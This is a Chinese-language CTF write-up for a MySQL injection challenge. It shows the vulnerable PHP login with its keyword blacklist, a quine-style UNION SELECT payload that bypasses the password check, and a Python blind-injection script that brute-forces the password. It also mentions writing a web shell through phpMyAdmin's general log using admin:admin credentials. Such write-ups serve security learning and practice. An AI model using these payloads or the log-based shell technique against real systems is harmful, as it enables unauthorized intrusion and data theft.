#SQL 注入

查看源码

```html
<!-- /?source -->
<html>
  <body>
    <form
      action="[/index.php](view-source:http://1.14.71.254:28878/index.php)"
      method="post"
    >
      <input type="text" name="username" placeholder="账号" /><br />
      <input type="password" name="password" placeholder="密码" /><br />
      <input type="submit" / value="登录">
    </form>
  </body>
</html>
```

加上/?source 可以查看源码

```php
<?php
include_once("lib.php");

function alertMes($mes,$url){
    die("<script>alert('{$mes}');location.href='{$url}';</script>");
}

function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'admin') {
        alertMes('only admin can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';";
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes("something wrong",'index.php');
    }
    if ($row['password'] === $password) {
        die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }
}



if(isset($_GET['source'])){
  show_source(__FILE__);
  die;
}
?>
```

[CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine 注入） - zhengna - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhengna/p/15917521.html)

通过分析发现只有输入正确的密码才能得到 FLAG，但是这张表其实是一张空表，所以爆破密码这条路走不通。

那就只有一个办法，就是构造一个输入输出完全一致的语句，就可以绕过限制并得到 FLAG

```sql
-- Quine基本形式：
replace(replace(‘str’,char(34),char(39)),char(46),‘str’)
-- 先将str里的双引号替换成单引号，再用str替换str里的.
-- str基本形式（可以理解成上面的"."）
replace(replace(".",char(34),char(39)),char(46),".")
-- 完整的Quine就是Quine基本形式+str基本形式
```

payload

```sql
1'/**/union/**/select/**/replace(replace('',char(34),char(39)),char(46),'')#
-- 可理解成我们的Quine的基本形式
1"/**/union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#
-- 这个就是我们str的基本形式

-- 先将str里的双引号替换成单引号
1'/**/union/**/select/**/replace(replace('.',char(34),char(39)),char(46),'.')#
-- 最终通过来回替换的形式达到了我们的目的
```

```sql
1'/**/union/**/select/**/replace(replace('1"/**/union/**/select/**/replace(repla
ce(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"/**/uni
on/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#
```

看到另一种：脚本跑密码

```py
import requests,time
alp = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~"
def get_pass():
    url = "http://1.14.71.254:28610/index.php"
    flag = ""
    while True:
        for i in alp:
            data={"username":"admin","password":f"1'or/**/password/**/like/**/'{flag+i}%'#"}
            resp = requests.post(url=url,data=data)
            time.sleep(0.1)
            if "something wrong" not in resp.text:
                flag+=i
                print(flag)
                break
            elif "~" in i:
                return
get_pass()
```

另外一种

```
http://1.14.71.254:28590/phpmyadmin
admin：admin
直接查看admin的密码
可以loadfile写文件
编辑 编辑 general log文档 OFF
编辑 编辑 general log file文档
可以日志文件写shell
```
